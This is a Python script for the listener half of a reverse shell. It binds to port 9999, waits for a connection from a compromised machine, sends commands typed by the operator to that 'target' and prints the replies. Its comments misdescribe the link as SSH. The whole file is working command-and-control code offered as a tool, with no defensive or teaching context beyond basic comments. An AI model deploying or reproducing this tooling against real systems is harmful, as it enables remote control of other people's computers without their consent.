import socket
#Run Codes from Command Line
import sys

def create_socket_i_connection():
	try:
		#Host corresponds to the IP Address
		global host, port, socket_i  
		host = ''
		#Port Identifies What Data are Comming in
		port = 9999
		socket_i = socket.socket()
	except socket.error as msg:
		print("Cannot provide a SSH Connection Between the Systems {}".format(msg))

#Binding the Socket_i to the Port
def binding_socket_i():
	try:
		global host, port, socket_i
		print("Binding the Socket to Port: " + str(port))
		socket_i.bind((host, port))
		#BACKLOG is equal to the number of pending connections the queue will hold
		socket_i.listen(2)
	except socket.error as msg:
		print("Socket Binding Error. {}".format(msg) + "\n Retrying...")
		binding_socket_i()

#Establishing a Connection with Client
def client_connection_socket_i():
	connection_ip, address = socket_i.accept()
	#We are Using AF_INET Family for Connection
	print("Connected to {0}, Port {1}".format(address[0],str(address[1])))
	#Sending the Shell Commands to the Connected IP/TCP
	send_command_socket_i(connection_ip)
	connection_ip.close()

#Sending the Commands to the Target Machines
def send_command_socket_i(connection_ip):
	while True:
		command_terminal = input()
		if command_terminal == "quit":
			connection_ip.close()
			socket_i.close()
			sys.exit()
		#The Commands in CMD are Stored as Bytes so we need to Encode and Decode the Data
		#Send over the SSH Client
		if len(str.encode(command_terminal)) > 0:
			connection_ip.send(str.encode(command_terminal))
			#Decoding the Responce in UTF-8 Character Decoding Format
			#1024b is the Buffer size during the Data Transmission
			responce_client = str(connection_ip.recv(1024), "utf-8")
			#3-5.20
			print(responce_client, end="")

def main_run():
	create_socket_i_connection()
	binding_socket_i()
	client_connection_socket_i()

#Running Our Main File
main_run()














